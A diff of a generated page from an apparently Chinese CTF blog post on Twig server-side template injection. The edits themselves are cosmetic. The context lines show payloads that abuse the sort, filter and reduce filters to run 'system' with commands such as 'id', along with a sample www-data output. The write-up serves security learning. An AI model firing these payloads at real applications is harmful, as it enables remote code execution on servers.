@@ -219,7 +219,7 @@ if (!doNotTrack) {
     <header class="article-category">
         
             <a href="/categories/ctf/" >
-                CTF
+                ctf
             </a>
         
     </header>
@@ -640,11 +640,11 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span><span class="line"><span class="cl"><span class="c1">// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </span></span></span></code></pre></div><p>在Twig 2.x 以及 3.x 的版本中， <code>_self</code> 的作用发生了变化，只能返回当前实例名的字符串，因此这个payload只能够再1.x版本使用 <!-- raw HTML omitted --></p>
 <p><figure><img src="../../../Documents/OrgNotes/OrgImages/Server_Side_Template_Injection_%28SSTI%29_%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%ef%bc%9a%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/2022-07-01_17-27-09_screenshot.png"
-         alt="Figure 1: Deprecated Features of Twig 1.x" width="700px"/><figcaption>
-            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted --><a class="link" href="https://twig.symfony.com/doc/1.x/deprecated.html#globals"  target="_blank" rel="noopener"
-    >Deprecated Features of Twig 1.x</a></p>
-        </figcaption>
-</figure>
+             alt="Figure 1: Deprecated Features of Twig 1.x" width="700px"/><figcaption>
+                <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted --><a class="link" href="https://twig.symfony.com/doc/1.x/deprecated.html#globals"  target="_blank" rel="noopener"
+        >Deprecated Features of Twig 1.x</a></p>
+            </figcaption>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>同时 <code>getFilter</code> 方法中也不再包含危险的函数了： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getFilter</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$name</span><span class="p">)</span><span class="o">:</span> <span class="o">?</span><span class="nx">TwigFilter</span>
@@ -796,10 +796,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-07-01_23-34-07_screenshot.png"
-         alt="Figure 2: uasort 函数测试命令行执行" width="300px"/><figcaption>
-            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->uasort 函数测试命令行执行</p>
-        </figcaption>
-</figure>
+             alt="Figure 2: uasort 函数测试命令行执行" width="300px"/><figcaption>
+                <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->uasort 函数测试命令行执行</p>
+            </figcaption>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>同样可以用来进行远程代码执行，payload如下： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}</span>
@@ -856,10 +856,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </ol>
 <p>也就是说这里$arrow直接可以配合$array进行执行 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-07-01_23-29-52_screenshot.png"
-         alt="Figure 3: array_filter 函数测试命令行执行" width="300px"/><figcaption>
-            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->array_filter 函数测试命令行执行</p>
-        </figcaption>
-</figure>
+             alt="Figure 3: array_filter 函数测试命令行执行" width="300px"/><figcaption>
+                <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->array_filter 函数测试命令行执行</p>
+            </figcaption>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>因此也可以payload于之前类似 <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}</span>
@@ -889,10 +889,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
 </span></span></code></pre></div><p>其中的 <code>array_reduce</code> 方法同样也也将 $arrow 作为回调函数直接执行，并将 $array 作为参数带入 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-07-01_23-40-14_screenshot.png"
-         alt="Figure 4: array_reduce 函数测试命令行调用" width="300px"/><figcaption>
-            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->array_reduce 函数测试命令行调用</p>
-        </figcaption>
-</figure>
+             alt="Figure 4: array_reduce 函数测试命令行调用" width="300px"/><figcaption>
+                <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->array_reduce 函数测试命令行调用</p>
+            </figcaption>
+    </figure>
  <!-- raw HTML omitted --></p>
 <p>那么payload同样也是类似的，不过这里要传入的参数需要包含至少两个，这样才符合两个操作值： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
@@ -979,7 +979,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 
 
         <span>
-            Last updated on Jul 01, 2022 23:41 BST
+            Last updated on Jul 01, 2022 23:41 &#43;0100
         </span>
     </section></footer>
 
